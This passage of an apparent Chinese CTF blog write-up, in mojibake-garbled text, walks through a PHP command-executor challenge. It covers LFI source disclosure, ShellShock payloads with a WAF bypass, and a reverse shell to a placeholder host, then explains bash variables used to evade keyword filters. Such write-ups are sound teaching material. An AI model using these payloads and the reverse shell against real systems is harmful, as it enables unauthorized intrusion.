filesæ˜¯ä¸ªç›®å½•åˆ—ä¸¾ç•Œé¢ï¼Œå¯ä»¥åˆ—ä¸¾å‡ ä¸ªç›®å½•\n \nè§‚å¯Ÿé¢˜ç›®ï¼Œé¢˜ç›® urlhttps://command-executor.hackme.inndy.tw/index.php?func=untarç­‰å‡å¸¦æœ‰func=xxxå‚æ•°æ¥å±•ç¤ºé¡µé¢ï¼ŒçŒœæµ‹ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ä½¿ç”¨func=php://filter/read=convert.base64-encode/resource=indexè¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾\n \nè§£ç å¾—åˆ° index.phpæºç \n\u0026lt;?php $pages = [ ['man', 'Man'], ['untar', 'Tar Tester'], ['cmd', 'Cmd Exec'], ['ls', 'List files'], ]; function fuck($msg) { header('Content-Type: text/plain'); echo $msg; exit; } $black_list = [ '\\/flag', '\\(\\)\\s*\\{\\s*:;\\s*\\};' ]; function waf($a) { global $black_list; if(is_array($a)) { foreach($a as $key =\u0026gt; $val) { waf($key); waf($val); } } else { foreach($black_list as $b) { if(preg_match(\u0026quot;/$b/\u0026quot;, $a) === 1) { fuck(\u0026quot;$b detected! exit now.\u0026quot;); } } } } waf($_SERVER); waf($_GET); waf($_POST); function execute($cmd, $shell='bash') { system(sprintf('%s -c %s', $shell, escapeshellarg($cmd))); } foreach($_SERVER as $key =\u0026gt; $val) { if(substr($key, 0, 5) === 'HTTP_') { putenv(\u0026quot;$key=$val\u0026quot;); } } $page = ''; if(isset($_GET['func'])) { $page = $_GET['func']; if(strstr($page, '..') !== false) { $page = ''; } } if($page \u0026amp;\u0026amp; strlen($page) \u0026gt; 0) { try { include(\u0026quot;$page.php\u0026quot;); } catch (Exception $e) { } } function render_default() { ?\u0026gt; \u0026lt;p\u0026gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026quot;windows-run.jpg\u0026quot; alt=\u0026quot;command executor\u0026quot;\u0026gt; \u0026lt;?php } ?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Command Executor\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;bootstrap/css/bootstrap.min.css\u0026quot; media=\u0026quot;all\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;comic-neue/font.css\u0026quot; media=\u0026quot;all\u0026quot;\u0026gt; \u0026lt;style\u0026gt; nav { margin-bottom: 1rem; } img { max-width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex\u0026quot;\u0026gt; \u0026lt;a class=\u0026quot;navbar-brand\u0026quot; href=\u0026quot;index.php\u0026quot;\u0026gt;Command Executor\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;navbar-nav\u0026quot;\u0026gt; \u0026lt;?php foreach($pages as list($file, $title)): ?\u0026gt; \u0026lt;li class=\u0026quot;nav-item\u0026quot;\u0026gt; \u0026lt;a class=\u0026quot;nav-link\u0026quot; href=\u0026quot;index.php?func=\u0026lt;?=$file?\u0026gt;\u0026quot;\u0026gt;\u0026lt;?=$title?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;?php if(is_callable('render')) render(); else render_default(); ?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; man.phpæºç ï¼š\n\u0026lt;?php function render() { $file = \u0026#39;man\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])) { $file = (string)$_GET[\u0026#39;file\u0026#39;]; if(preg_match(\u0026#39;/^[\\w\\-]+$/\u0026#39;, $file) !== 1) { echo \u0026#39;\u0026lt;pre\u0026gt;Invalid file name!\u0026lt;/pre\u0026gt;\u0026#39;; return; } } echo \u0026#39;\u0026lt;h1\u0026gt;Online documents\u0026lt;/h1\u0026gt;\u0026#39;; $cmds = [ \u0026#39;bash\u0026#39;, \u0026#39;ls\u0026#39;, \u0026#39;cp\u0026#39;, \u0026#39;mv\u0026#39; ]; echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; foreach($cmds as $cmd) { printf(\u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php?func=man\u0026amp;file=%s\u0026#34;\u0026gt;%1$s\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;, $cmd); } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; printf(\u0026#39;\u0026lt;h2\u0026gt;$ man %s\u0026lt;/h2\u0026gt;\u0026#39;, htmlentities($file)); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; execute(sprintf(\u0026#39;man %s | cat\u0026#39;, escapeshellarg($file))); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } ?\u0026gt;untar.phpæºç ï¼š\n\u0026lt;?php function render() { ?\u0026gt;\u0026lt;h1\u0026gt;Tar file tester\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Please upload a tar file to test\u0026lt;/p\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;index.php?func=untar\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;tarfile\u0026#34; id=\u0026#34;tarfile\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload \u0026amp;amp; Test\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_FILES[\u0026#39;tarfile\u0026#39;])) { printf(\u0026#39;\u0026lt;h2\u0026gt;$ tar -tvf %s\u0026lt;/h2\u0026gt;\u0026#39;, htmlentities($_FILES[\u0026#39;tarfile\u0026#39;][\u0026#39;name\u0026#39;])); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; execute(sprintf(\u0026#39;tar -tvf %s 2\u0026gt;\u0026amp;1\u0026#39;, escapeshellarg($_FILES[\u0026#39;tarfile\u0026#39;][\u0026#39;tmp_name\u0026#39;]))); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt; ls.phpæºç ï¼š\n\u0026lt;?php function render() { $file = \u0026#39;.\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])) { $file = (string)$_GET[\u0026#39;file\u0026#39;]; } echo \u0026#39;\u0026lt;h1\u0026gt;Dictionary Traversal\u0026lt;/h1\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; $dirs = [\u0026#39;.\u0026#39;, \u0026#39;..\u0026#39;, \u0026#39;../..\u0026#39;, \u0026#39;/etc/passwd\u0026#39;]; foreach($dirs as $dir) { printf(\u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php?func=ls\u0026amp;file=%s\u0026#34;\u0026gt;%1$s\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;, $dir); } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; printf(\u0026#39;\u0026lt;h2\u0026gt;$ ls %s\u0026lt;/h2\u0026gt;\u0026#39;, htmlentities($file)); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; execute(sprintf(\u0026#39;ls -l %s\u0026#39;, escapeshellarg($file))); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } ?\u0026gt;cmd.phpæºç ï¼š\n\u0026lt;?php function render() { $cmd = \u0026#39;\u0026#39;; if(isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = (string)$_GET[\u0026#39;cmd\u0026#39;]; } ?\u0026gt;\u0026lt;h1\u0026gt;Command Execution\u0026lt;/h1\u0026gt; \u0026lt;?php echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; $cmds = [\u0026#39;ls\u0026#39;, \u0026#39;env\u0026#39;]; foreach($cmds as $c) { printf(\u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php?func=cmd\u0026amp;cmd=%s\u0026#34;\u0026gt;%1$s\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;, $c); } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;func\u0026#34; value=\u0026#34;cmd\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group-append\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;cmd.focus();\u0026lt;/script\u0026gt; \u0026lt;?php if(strlen($cmd) \u0026gt; 0) { printf(\u0026#39;\u0026lt;h2\u0026gt;$ %s\u0026lt;/h2\u0026gt;\u0026#39;, htmlentities($cmd)); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; switch ($cmd) { case \u0026#39;env\u0026#39;: case \u0026#39;ls\u0026#39;: case \u0026#39;ls -l\u0026#39;: case \u0026#39;ls -al\u0026#39;: execute($cmd); break; case \u0026#39;cat flag\u0026#39;: echo \u0026#39;\u0026lt;img src=\u0026#34;cat-flag.png\u0026#34; alt=\u0026#34;cat flag\u0026#34;\u0026gt;\u0026#39;; break; default: printf(\u0026#39;%s: command not found\u0026#39;, htmlentities($cmd)); } echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt; æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ls.phpæ¥æ‰¾flagäº†ï¼Œå› ä¸ºls.phpæ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨func=ls\u0026amp;file=../../../å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶\n \næ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆå»è¯»äº†ï¼Œman.phpå› ä¸ºæœ‰preg_match('/^[\\w\\-]+$/', $file) !== 1é™åˆ¶å¾—æ¯”è¾ƒæ­»ï¼Œuntar.phpè²Œä¼¼åªæœ‰tar -tvfå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œåªæœ‰cmd.phpç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒä¸å¤ªå¯»å¸¸çš„envè¿™ä¸ªå‘½ä»¤ï¼Œå…¶å®è¿™æ ·ä¹Ÿç®—æ˜¯æç¤ºå¾—æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œæ¯”è¾ƒå®¹æ˜“è®©äººæƒ³åˆ°ä¹Ÿå¯ä»¥æ¯”è¾ƒå®¹æ˜“æœåˆ°ShellShockæ¼æ´ï¼Œå¹¶ä¸”åœ¨index.phpä¸­å‘ç°æœ‰\n$black_list = [ \u0026#39;\\/flag\u0026#39;, \u0026#39;\\(\\)\\s*\\{\\s*:;\\s*\\};\u0026#39; ]; function waf($a) { global $black_list; if(is_array($a)) { foreach($a as $key =\u0026gt; $val) { waf($key); waf($val); } } else { foreach($black_list as $b) { if(preg_match(\u0026#34;/$b/\u0026#34;, $a) === 1) { fuck(\u0026#34;$bdetected! exit now.\u0026#34;); } } } } waf($_SERVER); waf($_GET); waf($_POST); foreach($_SERVER as $key =\u0026gt; $val) { if(substr($key, 0, 5) === \u0026#39;HTTP_\u0026#39;) { putenv(\u0026#34;$key=$val\u0026#34;); } } å…³é”®å°±åœ¨putenvå‡½æ•°ï¼Œç”±äºShellShockæ¼æ´ padyload éœ€è¦å‚æ•°\nenv x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test\u0026#34; æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨putenvå®ç°å‚æ•°ä¼ é€’ï¼Œç›´æ¥è®¾ç½®User-agent: () { :;}; echo 222222ï¼Œå‘ç°è¢« waf\n \nåˆ†æ waf ç»“åˆæ¼æ´æˆå› ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ€åçš„};ä¸­é—´æ·»åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ï¼Œè®¾ç½®User-Agent: () { :;} ; echo 222222ï¼ŒæˆåŠŸå‘ç°è¾“å‡º 22222 ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨() { _; } \u0026gt;_[$($())] { whoami; }è¿™ä¸ª payload\n \nå‘ç°å½“å‰ç”¨æˆ·ä¸ºwww-dataï¼Œè€Œæˆ‘ä»¬ä¹‹å‰å‘ç°æ ¹ç›®å½•flagçš„æƒé™ä¸º-r-------- 1 flag root 37 Jan 9 2018 flagï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»å–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªflag-readerä¸flag-reader.cçš„æ–‡ä»¶ï¼Œè¿™åº”è¯¥æ˜¯é¢˜ç›®æç¤ºäº†ã€‚å› ä¸ºindex.phpåˆæŠŠflagå…³é”®å­—å±è”½äº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½ç›´æ¥è¯»å–flag-reader.cï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨é€šé…ç¬¦è¯»å–ï¼Œä¾‹å¦‚ä½¿ç”¨fla*.c\nä½¿ç”¨() { _; } \u0026gt;_[$($())] { cat /fla*.c; }å¾—åˆ°flag-reader.cæºç \n \nFlag-reader.c:\n#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;syscall.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, \u0026amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) { write(1, \u0026#34;Not enough random\\n\u0026#34;, 18); } setuid(1337); seteuid(1337); alarm(1); write(1, \u0026amp;rnd, sizeof(rnd)); read(0, \u0026amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) { int fd = open(argv[1], O_RDONLY); if(fd \u0026gt; 0) { int s = read(fd, buff, 1024); if(s \u0026gt; 0) { write(1, buff, s); } close(fd); } else { write(1, \u0026#34;Can not open file\\n\u0026#34;, 18); } } else { write(1, \u0026#34;Wrong response\\n\u0026#34;, 16); } } ä½¿ç”¨bash -c \u0026quot;sh \u0026gt;\u0026amp; /dev/tcp/your ip/port 0\u0026gt;\u0026amp;1\u0026quot; ç›´æ¥åå¼¹ shell\nè¿è¡Œflag-reader\n \nå®¡è®¡ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œå¤§è‡´æ˜¯è¾“å‡ºä¸€ä¸²éšæœºæ•°ï¼Œç„¶ååœ¨1sä¹‹å†…åˆè¦è¾“å…¥è¿›å»ï¼Œå¦åˆ™å°±write(1, \u0026quot;Wrong response\\n\u0026quot;, 16);\u0026hellip;\nç„¶è€Œæˆ‘åœ¨å›å¼¹ shell ä¹‹åï¼Œåˆ©ç”¨/tmpå¯å†™çš„æƒé™ï¼Œè²Œä¼¼æœ‰ç‚¹å°é—®é¢˜ï¼Œä¸€æ—¦cat /tmp/zeddï¼Œé“¾æ¥å°±æ–­æ‰äº†ï¼Œæ— å¥ˆåªèƒ½æ‰¾å…¶ä»–æ–‡ä»¶å¤¹ï¼Œå‘ç°/run/lockä¸/var/tmpå‡å¯è¯»å¯å†™ï¼Œä½¿ç”¨/flag-reader flag \u0026gt; /run/lock/zedd \u0026lt; /run/lock/zeddå†™å…¥ flag\nåå¼¹ shell ä½¿ç”¨catéå¸¸å®¹æ˜“æ–­æ‰ï¼Œæœ€å¥½ä½¿ç”¨æ‰§è¡Œçš„æ–¹å¼ï¼Œæœ€åå¾—åˆ° flag\n \nä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å…… ç‰¹æ®Šå˜é‡ è¿™é‡Œå†å¯¹ä¸Šç¯‡è¿›è¡Œä¸€å®šçš„è¡¥å……ä¸è§£é‡Šã€‚\n$n    å˜é‡ å«ä¹‰     $0 å½“å‰è„šæœ¬çš„æ–‡ä»¶å   $n ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯$2(0\u0026lt;n\u0026lt;9)   ${n} 9\u0026lt;næ—¶éœ€è¦åŠ ä¸Šå¤§æ‹¬å·    ä¾‹å¦‚ï¼Œè„šæœ¬æ–‡ä»¶å¦‚ä¸‹\n#!/bin/bash  echo \u0026#34;File Name: $0\u0026#34; echo \u0026#34;First Parameter : $1\u0026#34; echo \u0026#34;First Parameter : $2\u0026#34; æ‰§è¡Œè„šæœ¬æ–‡ä»¶\n$ ./test.sh Hello Zedd File Name: ./test.sh First Parameter : Hello Second Parameter : Zedd è€Œå½“æ²¡æœ‰å‚æ•°çš„æ—¶å€™ï¼Œ$nå°±ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨cat /fl$1agè¿™æ ·ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œå¹¶ä¸”åœ¨ bash ç¯å¢ƒä¸‹\n$ echo $0 bash æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„ payload ï¼Œå¯ä»¥ç”¨åœ¨ bash è¿™ä¸ªå…³é”®å­—è¿‡æ»¤ä½†æ˜¯æœ‰éœ€è¦ç”¨åˆ° bash çš„æƒ…å†µä¸‹ï¼Œå‰ææ˜¯ç¯å¢ƒç”¨çš„æ˜¯ bash\n$ {printf,\u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;}|$0 flag{xxx} $IFS IFS(Internal Field Seprator) ï¼Œå†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼ŒShell çš„ç¯å¢ƒå˜é‡åˆ†ä¸º set, env ä¸¤ç§ï¼Œå…¶ä¸­ set å˜é‡å¯ä»¥é€šè¿‡ export å·¥å…·å¯¼å…¥åˆ° env å˜é‡ä¸­ã€‚å…¶ä¸­ï¼Œset æ˜¯æ˜¾ç¤ºè®¾ç½®shellå˜é‡ï¼Œä»…åœ¨æœ¬ shell ä¸­æœ‰æ•ˆï¼›env æ˜¯æ˜¾ç¤ºè®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡ ï¼Œä»…åœ¨å½“å‰ä¼šè¯ä¸­æœ‰æ•ˆã€‚æ¢å¥è¯è¯´ï¼Œset å˜é‡é‡ŒåŒ…å«äº† env å˜é‡ï¼Œä½† set å˜é‡ä¸ä¸€å®šéƒ½æ˜¯ env å˜é‡ã€‚è¿™ä¸¤ç§å˜é‡ä¸åŒä¹‹å¤„åœ¨äºå˜é‡çš„ä½œç”¨åŸŸä¸åŒã€‚æ˜¾ç„¶ï¼Œenv å˜é‡çš„ä½œç”¨åŸŸè¦å¤§äº›ï¼Œå®ƒå¯ä»¥åœ¨ subshell ä¸­ä½¿ç”¨ã€‚\nè€Œ IFS æ˜¯ä¸€ç§ set å˜é‡ï¼Œå½“ shell å¤„ç†\u0026quot;å‘½ä»¤æ›¿æ¢\u0026quot;å’Œ\u0026quot;å‚æ•°æ›¿æ¢\u0026quot;æ—¶ï¼Œshell æ ¹æ® IFS çš„å€¼ï¼Œé»˜è®¤æ˜¯ space, tab, newline æ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™è¯¥å˜é‡ã€‚\n$ echo $IFS $ echo \u0026#34;$IFS\u0026#34; | od -b 0000000 040 011 012 012 0000004 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥è¾“å‡ºIFSæ˜¯çœ‹ä¸åˆ°çš„ï¼ŒæŠŠå®ƒè½¬åŒ–ä¸ºäºŒè¿›åˆ¶å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ\u0026ldquo;040\u0026quot;æ˜¯ç©ºæ ¼ï¼Œ\u0026ldquo;011\u0026quot;æ˜¯Tabï¼Œ\u0026ldquo;012\u0026quot;æ˜¯æ¢è¡Œç¬¦\u0026rdquo;\\n\u0026rdquo; ã€‚æœ€åä¸€ä¸ª 012 æ˜¯å› ä¸º echo é»˜è®¤æ˜¯ä¼šæ¢è¡Œçš„ã€‚\n$? ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ã€‚é€€å‡ºçŠ¶æ€æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¼šè¿”å›0ï¼Œå¤±è´¥è¿”å›1ã€‚ä¸è¿‡ï¼Œä¹Ÿæœ‰ä¸€äº›å‘½ä»¤è¿”å›å…¶ä»–å€¼ï¼Œè¡¨ç¤ºä¸åŒç±»å‹çš„é”™è¯¯ã€‚\n$ å½“å‰ Shell è¿›ç¨‹ IDã€‚å¯¹äº Shell è„šæœ¬ï¼Œå°±æ˜¯è¿™äº›è„šæœ¬æ‰€åœ¨çš„è¿›ç¨‹ IDã€‚\n$ echo $$ 75576 $# ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚\nè„šæœ¬æ–‡ä»¶å†…å®¹ï¼š\n#!/bin/bash  echo \u0026#34;Total Number of Parameters : $#\u0026#34; æ‰§è¡Œå‘½ä»¤\n$ ./test.sh Hello Zedd Total Number of Parameters : 2 $*ä¸$@ éƒ½æ˜¯ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚\nè„šæœ¬æ–‡ä»¶å†…å®¹ï¼š\n#!/bin/bash  echo \u0026#34;Quoted Values: $@\u0026#34; echo \u0026#34;Quoted Values: $*\u0026#34; æ‰§è¡Œå‘½ä»¤ï¼š\n$ ./test.sh Hello Zedd Quoted Values: Hello Zedd Quoted Values: Hello Zedd å®ƒä»¬ä¸è¢«åŒå¼•å·(\u0026rdquo; \u0026ldquo;)åŒ…å«æ—¶ï¼Œéƒ½ä»¥\u0026quot;1\u0026quot;\u0026ldquo;2\u0026rdquo; â€¦ \u0026ldquo;$n\u0026rdquo; çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚\nä½†æ˜¯å½“å®ƒä»¬è¢«åŒå¼•å·(\u0026rdquo; \u0026ldquo;)åŒ…å«æ—¶ï¼Œ\u0026ldquo;âˆ—\u0026quot;ä¼šå°†æ‰€æœ‰çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä»¥\u0026quot;1 2â€¦n\u0026quot;çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ï¼›\u0026quot;@\u0026ldquo;ä¼šå°†å„ä¸ªå‚æ•°åˆ†å¼€ï¼Œä»¥\u0026quot;1\u0026rdquo; \u0026ldquo;2\u0026rdquo;â€¦\u0026ldquo;n\u0026rdquo; çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚\nå†…ç½®å˜é‡ç»•è¿‡ ä¸Šç¯‡å…¶å®æåˆ°äº†ä¸€ç‚¹å†…ç½®å˜é‡ç»•è¿‡ï¼Œä½†æ˜¯è®²çš„ä¹Ÿä¸å¹¶ä¸å¤šï¼Œåªæ˜¯å¤§æ¦‚æäº†ä¸€ä¸‹ã€‚è¿™é‡Œå†ç»™ä¸€äº›å¸¸ç”¨çš„ bash å†…ç½®çš„ç¯å¢ƒå˜é‡\n$BASH $ echo $BASH /usr/local/bin/bash è¿”å› bash äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„\n$HOME $ $HOME bash: /Users/zedd: Is a directory è¿”å›å½“å‰ç”¨æˆ·æ‰€å±ç›®å½•\n$PWD $ echo $PWD / æ˜¾ç¤ºå½“å‰ç›®å½•\n$OLDPWD $ echo $OLDPWD /Users/zedd/Desktop/ è¿”å›ä¸Šæ¬¡æ‰€åœ¨ç›®å½•\n$PATH $ echo $PATH /bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin ç¯å¢ƒå˜é‡$PATH\n$PS1 $ echo $PS1 \\s-\\v\\$ çœ‹åˆ°çš„å‘½ä»¤è¡Œä¸»è¦æç¤º\n$PS2 $ echo $PS2 \u0026gt; é¢å¤–è¾“å…¥çš„è¾…åŠ©æç¤ºï¼Œè¡¨ç¤ºä¸º\u0026gt;ï¼Œ$PS3æ˜¯ Shell è„šæœ¬ä¸­ä½¿ç”¨selectæ—¶çš„æç¤ºç¬¦ï¼Œæ˜¾ç¤ºä¸ºç©ºï¼Œè¿™é‡Œå°±ä¸å†å•ç‹¬åˆ—ä¸¾äº†\n$PS4 $ echo $PS4 + ä¸set -xé…åˆç”¨æ¥ä¿®æ”¹è·Ÿè¸ªè¾“å‡ºçš„å‰ç¼€ï¼Œæ˜¾ç¤ºä¸º+\nä¸¾ä¸ªğŸŒ° Layer7 CTF 2018 å¯ä»¥è®¿é—®https://cat.canhack.me/è¿™ä¸ªåœ¨çº¿åœ°å€\né¢˜ç›®æè¿° This service provides read the file. https://cat.canhack.me/ This challenge was published in the Layer7 CTF in 2018. WriteUp ç‚¹è¿›å»å‘ç°æœ‰\n\u0026lt;b\u0026gt;Usage\u0026lt;/b\u0026gt;: Please enter the parameter like as in \u0026lt;a href=\u0026#34;/?file=test.txt\u0026#34;\u0026gt;this\u0026lt;/a\u0026gt;. è·Ÿè¿›å¾—åˆ°test.txtçš„å†…å®¹\n \nçŒœæµ‹ä¸ºæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç›´æ¥è¯»å–flagè¢«wafï¼Œç›´æ¥è¯»å–https://cat.canhack.me/?file=index.php\n\u0026lt;?php error_reporting(0); require __DIR__.\u0026#39;/flag-f72a161d445915d2bdcdc820c4143353.php\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])){ if(preg_match(\u0026#39;/flag|\\\u0026#39;|\\\u0026#34;|`|\\\\\\\\|;|\\(|\\)|\\*|\\?|\\.\\.|\\//i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])){ die(\u0026#39;no hack\u0026#39;); } system(\u0026#39;cat \u0026#34;\u0026#39;.$_GET[\u0026#39;file\u0026#39;].\u0026#39;\u0026#34;\u0026#39;); }else{ echo \u0026#39;\u0026lt;b\u0026gt;Usage\u0026lt;/b\u0026gt;: Please enter the parameter like as in \u0026lt;a href=\u0026#34;/?file=test.txt\u0026#34;\u0026gt;this\u0026lt;/a\u0026gt;.\u0026#39;; } è¿˜å‰©ä¸‹{}ã€\u0026lt;\u0026gt;ã€[]ã€+-=ã€^ã€$ã€@ã€!ã€\u0026amp;ï¼Œæ˜¯ä¸ªå…³é”®å­—ç»•è¿‡ï¼Œæœ‰$ï¼Œæˆ‘ä»¬å¾ˆå¿«å¯ä»¥è”æƒ³åˆ°å¯ä»¥ç”¨$nè¿™ç§æ–¹å¼ç»•è¿‡ï¼Œæœ€ç»ˆ payload\nhttps://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php å‚è€ƒï¼š Internal Variables\nShellä¸­çš„IFSè§£æƒ‘\nShell ç‰¹æ®Šå˜é‡\nä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å†™\nåˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒLinuxæœ¬åœ°ææƒ\nUnix Wildcards Gone Wild\n","date":"2019-03-12T13:44:47Z","permalink":"https://blog.zeddyu.info/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/","title":"å‘½ä»¤æ‰§è¡Œåˆ°ææƒ"},{"content":"Write up of Pentesterlab\u0026rsquo;s XSS and MySQL FILE\n[TOC]\nPre ä¸ä¹‹å‰ä¸€æ ·ï¼Œå¯¼å…¥ iso åæŸ¥çœ‹ ip å³å¯\nHacking Injection and XSS ä¸€å¼€å§‹åšäº†å¾ˆå¤šå·¥ä½œåœ¨ fuzz 